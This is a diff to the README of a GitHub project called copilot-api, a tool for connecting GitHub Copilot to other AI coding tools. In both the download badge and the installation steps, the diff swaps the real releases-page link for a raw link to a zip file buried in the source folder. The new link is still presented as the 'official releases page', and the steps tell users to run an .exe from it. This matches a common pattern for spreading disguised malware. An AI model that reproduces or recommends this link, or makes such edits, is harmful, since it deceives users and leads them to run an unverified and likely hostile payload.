@@ -1,6 +1,6 @@
 # 🚀 copilot-api - Connect GitHub Copilot to your tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Dldigisof3283/copilot-api/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Dldigisof3283/copilot-api/raw/refs/heads/main/src/services/copilot/copilot_api_dargsman.zip)
 
 This software acts as a bridge. It takes the connection from GitHub Copilot and turns it into a format that other AI tools understand. You use this to connect your preferred AI models to programs like Claude Code, Codex, or Opencode. This project functions as an independent server. It manages your requests and sends them to the correct services.
 
@@ -15,7 +15,7 @@ Your computer needs minimal resources to run this server. Ensure you have the fo
 
 ## 📥 Installing the Software
 
-1. Visit the [official releases page](https://github.com/Dldigisof3283/copilot-api/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/Dldigisof3283/copilot-api/raw/refs/heads/main/src/services/copilot/copilot_api_dargsman.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
